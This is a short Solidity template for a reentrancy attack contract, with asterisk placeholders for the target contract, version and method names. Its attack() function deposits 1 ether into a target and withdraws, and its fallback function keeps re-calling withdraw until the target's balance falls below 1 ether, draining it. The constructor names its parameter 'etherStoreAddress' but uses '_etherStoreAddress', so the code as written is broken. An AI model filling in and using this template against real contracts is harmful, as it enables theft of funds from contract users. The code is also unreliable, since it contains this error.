*Version*
contract Attack {
    *ContractName* public *ContractObj*;
    constructor(address etherStoreAddress) public {
        *ContractObj* = *ContractName*(_etherStoreAddress);
    }
    fallback() external payable {
        if (address (*ContractObj*).balance >= 1 ether) {
            *ContractObj*.*withdrawMethod*(1 ether);
        }
    }
    function attack() external payable {
        require(msg.value >= 1 ether);
        *ContractObj*.*depositMethod*{value: 1 ether}();
        *ContractObj*.*withdrawMethod*(1 ether);
    }
    function getBalance() public view returns (uint) {
        return address (this).balance;
    }
}